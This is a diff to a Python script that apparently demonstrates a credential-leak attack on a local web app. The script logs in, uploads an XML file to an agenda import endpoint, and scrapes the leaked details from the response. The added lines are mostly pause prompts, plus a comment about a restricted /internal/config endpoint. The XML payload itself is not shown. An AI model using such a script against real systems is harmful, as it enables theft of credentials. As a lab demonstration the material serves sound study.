@@ -1,4 +1,5 @@
 #uploading the xml file, then showing that its leaking the credentials, which shouldnt be there in the first place
+#<!-- NOTE: /internal/config restricted to localhost only. do not expose. --># displayed in the sourcefiles of landing page.
 import sys
 import requests
 from bs4 import BeautifulSoup
@@ -28,7 +29,15 @@ if not cookies.get("session"):
 print(f"{GREEN}Logged in successfully with " + identity + " and " + password )
 
 print(f"{RESET}__________")
- 
+input(f"{GREEN}press anything to upload xmlscript.xml to : http://localhost:4942/agenda/import")
+print("___________________________________________________________________________________________")
+print("___________________________________________________________________________________________")
+print("___________________________________________________________________________________________")
+print(f"CONTINUING.")
+print("___________________________________________________________________________________________")
+print("___________________________________________________________________________________________")
+print(f"___________________________________________________________________________________________{RESET}")
+print("uploading.")
 # step 2 - upload file
 
 filepath = "xmlscript.xml"
@@ -51,6 +60,17 @@ with open(filepath, "rb") as f:
 print("Upload status:", response.status_code)
 
 # step 3 - pass the response to Beautifulsoup (parsing websites library, and extracting the now leaked details)
+
+print(f"{RESET}__________")
+input(f"{GREEN}press anything to access the information displayed by the website")
+print("___________________________________________________________________________________________")
+print("___________________________________________________________________________________________")
+print("___________________________________________________________________________________________")
+print(f"CONTINUING.")
+print("___________________________________________________________________________________________")
+print("___________________________________________________________________________________________")
+print(f"___________________________________________________________________________________________{RESET}")
+print("displaying.")
 
 soup = BeautifulSoup(response.text, "html.parser")
 
